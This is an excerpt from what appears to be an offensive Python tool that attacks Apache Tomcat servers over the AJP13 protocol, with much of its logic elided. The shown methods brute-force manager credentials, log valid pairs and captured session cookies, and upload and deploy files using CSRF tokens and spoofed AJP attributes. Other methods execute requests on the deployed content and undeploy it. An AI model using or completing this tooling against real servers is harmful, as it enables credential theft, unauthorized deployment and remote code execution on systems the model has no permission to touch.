...
class Tomcat(object):
    ...
    def test_password(self, user, password):
        ...
        while not stop:
            ...
            if snd_hdrs_res.http_status_code == 404:
                ...
                Logger.log('found valid credz: %s:%s' % (user, password), 'success')
                res = True
                stop = True
                if 'Set-Cookie' in snd_hdrs_res.response_headers:
                    Logger.log('here is your cookie: %s' % (snd_hdrs_res.response_headers.get('Set-Cookie', '')), 'success')
            elif snd_hdrs_res.http_status_code == 403:
                Logger.log('found valid credz: %s:%s but the user is not authorized to access this resource' % (user, password), 'info')
                stop = True
    ...
    def start_bruteforce(self, users, passwords, req_uri, autostop):
        Logger.log('attacking a tomcat instance at ajp13://%s:%d%s' % (self.target_host, self.target_port, req_uri), 'info')
    ...
    def upload(self, filename, user, password, old_version, headers={}):
        ...
        if old_version == False:
            if len(deploy_csrf_token) == 0:
                Logger.log('failed to get csrf token, check your creds', 'fail')
                return
        ...
        attributes = [{"name": "req_attribute", "value": ("JK_LB_ACTIVATION", "ACT")}, {"name": "req_attribute", "value": ("AJP_REMOTE_PORT", "{}".format(self.socket.getsockname()[1]))}]
        if old_version == False:
    ...
    def execute(self, uri, method, user, password):
        ...
        headers, data = self.perform_request(uri, {}, method, user, password, attributes=attributes)
    ...
    def undeploy(self, path, user, password, old_version, headers={}):
        ...
        if old_version == False:
            if len(deploy_csrf_token) == 0:
                Logger.log('failed to get csrf token. check the credentials', 'fail')
                return
